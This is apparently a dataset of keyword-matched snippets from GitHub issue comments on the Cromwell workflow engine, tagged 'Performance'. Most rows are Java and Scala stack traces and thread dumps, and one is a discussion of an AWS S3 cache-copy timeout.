akka.actor.Actor.aroundReceive$(Actor.scala:537); 	at cromwell.engine.io.IoActorProxy.aroundReceive(IoActorProxy.scala:16); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); 	at akka.actor.ActorCell.invoke(ActorCell.scala:581); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dis,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680:1668,cache,cache,1668,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679399680,1,['cache'],['cache']
Performance,"at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d4000 nid=0x9f9 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread11"" #16 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d1000 nid=0x9f8 waiting on condition [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread10"" #15 daemon prio=9 os_prio=0 tid=0x00007fdbcc2cf000 nid=0x9f7 waiting on condition [0x0000000000000",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5673,concurren,concurrent,5673,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,"at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; java.lang.Thread.State: TIMED_WAITING (on object monitor); at java.lang.Object.wait(Native Method); at java.lang.ref.ReferenceQueue.remove(ReferenceQueue.java:143); - locked <0x000000015b76b538> (a java.lang.ref.ReferenceQueue$Lock); at com.mysql.jdbc.AbandonedConnectionCleanupThread.run(AbandonedConnectionCleanupThread.java:43). ""Service Thread"" #17 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d4000 nid=0x9f9 runnable [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread11"" #16 daemon prio=9 os_prio=0 tid=0x00007fdbcc2d1000 nid=0x9f8 waiting on condition [0x0000000000000000]; java.lang.Thread.State: RUNNABLE. ""C1 CompilerThread10"" #15 daemon pri",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:5589,concurren,concurrent,5589,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['concurren'],['concurrent']
Performance,ateSchema(LiquibaseUtils.scala:31); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 11:09:46 cromwell-test_1 | 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:96); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 11:09:46 cromwell-test_1 | 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.liftedTree1$1(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.run(BasicBackend.scala:275); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); 11:09:46 cromwell-test_1 | 	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); 11:09:46 cromwell-test_1 | 	at java.lang.Thread.run(Thread.java:748); 11:09:46 cromwell-test_1 | Caused by: java.lang.NullPointerException: null; 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.getGenerators(SqlGeneratorFactory.java:123); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.createGeneratorChain(SqlGeneratorFactory.java:189); 11:09:46 cromwell-test_1 | 	at liquibase.sqlgenerator.SqlGeneratorFactory.generateSql(SqlGeneratorFactory.java:221); 11:09:46 cromwell-test_1 | 	at liquibase.executor.AbstractExecutor.applyVisitors(AbstractExecutor.java:25); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.access$700(JdbcExecutor.java:36); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor$QueryStatementCallback.doInStatement(JdbcExecutor.java:338); 11:09:46 cromwell-test_1 | 	at liquibase.executor.jvm.JdbcExecutor.execute(JdbcExecutor.ja,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766:5059,concurren,concurrent,5059,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4328#issuecomment-434037766,1,['concurren'],['concurrent']
Performance,"aught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:6005,concurren,concurrent,6005,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"aught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(For",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:9580,concurren,concurrent,9580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"aught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:8387,concurren,concurrent,8387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"aught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.PlotACNVResults:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:7194,concurren,concurrent,7194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"aught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:10778,concurren,concurrent,10778,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"ava:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macroAssert(Assertions.scala:501); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$5(HealthMonitorServiceActorSpec.scala:48); at scala.collection.immutable.List.map(List.scala:283); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$eventualStatus$1(HealthMonitorServiceActorSpec.scala:40); at org.scalatest.concurrent.Eventually.makeAValiantAttempt$1(Eventually.scala:395); at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:409); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventually(HealthMonitorServiceActorSpec.scala:20); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.eventualStatus(HealthMonitorServiceActorSpec.scala:32); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.$anonfun$new$5(HealthMonitorServiceActorSpec.scala:81); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:6674,concurren,concurrent,6674,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"ay be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:2025,Cache,Cache,2025,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['Cache'],['Cache']
Performance,"bExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:10:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mail",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:5928,concurren,concurrent,5928,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"bExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:6:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.aroundReceive(JesAsyncBackendJobExecutionActor.scala:82); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:38:11,89] [warn] 1 failures fetching JES statuses: {""domain"":""global"",""message"":""Deadline expired before operation could complete."",""reason"":""backendError""}; [2016-10-28 14:38:11,89] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.AllelicCNV:7:1]: Caught exception, retrying:; java.io.IOException: Google request failed: {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:30); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor.Ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:10701,concurren,concurrent,10701,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
